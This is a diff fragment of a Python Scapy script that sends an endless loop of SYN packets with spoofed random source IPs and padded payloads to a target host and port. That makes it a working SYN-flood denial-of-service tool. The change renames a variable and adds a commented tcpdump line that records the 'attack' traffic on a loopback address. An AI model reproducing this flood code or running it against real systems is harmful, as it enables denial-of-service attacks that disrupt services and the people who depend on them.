@@ -5,8 +5,11 @@ def main():
     ip = IP(src=RandIP(), dst=target_ip)
     tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
     raw = Raw(b"X"*1024)
-    p = ip / tcp / raw
-    send(p, loop=1, verbose=0)
+    pak = ip / tcp / raw
+    send(pak, loop=1, verbose=0)
 
 if __name__ == "__main__":
     main()
+
+
+# sudo tcpdump -i any host 127.0.0.2 -w attack.pcap
